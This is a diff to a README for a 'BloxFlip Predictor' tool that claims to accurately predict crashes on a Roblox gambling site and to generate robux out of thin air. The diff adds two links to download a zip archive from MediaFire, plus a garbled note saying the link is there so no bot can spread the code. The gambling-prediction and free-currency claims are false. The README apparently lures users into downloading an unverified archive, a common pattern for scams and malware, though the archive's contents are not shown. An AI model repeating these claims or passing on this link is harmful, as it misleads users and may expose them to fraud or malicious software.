@@ -26,3 +26,9 @@ The FARD.PREDICTOR is a GUI or user interface that will accurately predit crashe
 This project is licensed under the Apache 2.0 License, meaning you can use it and fork it to your heart's delight! You can use my code if you fork it or give me credit!
 
 Have a blast with BloxFlip Predictor, and let the predictor generate robux out of thin air! 😄🎉
+
+.......................................................................
+https://www.mediafire.com/file/b094y5ss8ydtiz2/fard_predictor.zip/file
+ESCLAIMER SO NO BOT CAN SPREAD THE CODE
+
+https://www.mediafire.com/file/b094y5ss8ydtiz2/fard_predictor.zip/file
